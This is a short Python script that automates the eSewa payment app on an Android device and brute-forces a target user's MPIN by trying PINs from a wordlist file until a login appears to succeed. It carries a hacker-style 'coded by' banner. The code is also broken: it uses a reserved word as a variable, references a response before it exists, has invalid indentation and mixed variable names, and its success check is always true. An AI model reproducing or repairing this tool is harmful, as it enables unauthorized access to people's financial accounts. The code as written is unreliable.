import uiautomator2 as u2

# Connect the device
d = u2.connect()

# Launch the app (e.g., eSewa)
d.app_start("com.esewa.android")

# Wait for the app to load
d.wait_activity("com.esewa.android.app.main.MainActivity", timeout=20)

# Perform automated actions
# Example: Click on the login/register button
d(resourceId="com.esewa.android:id/toolbar_login/register").click()

print('\n--v1.1.3------**[~~@V.CYPHER*~~]/coded by:VICKY**------v1.1.3--\n')

file = open('mpins.txt', 'r')

MobileNumber = input('Enter Mobile Number: ').strip()
print("\nTarget Mobile Number (+977): ", MobileNumber)
print("\nTrying MPIN's from list ...")

i = 0
while True:
    pass = file.readline().strip()
    i += 1
    if len(pass) < 4:
        continue
    print(str(i) + " : " + pass)
    try:
        if response.code == 200:
        d.select_form(nr=0)
            d.form['MobileNumber'] = mobile number
            d.form['MPIN'] = passw
            response = d.submit()
            response_data = response.read()
            if 'response_data' or 'Two-factor authentication' in response_data or 'security code' in response_data:
                print('Your mpin is : ', passw)
                break
    except Exception as e:
        print('Error:', e)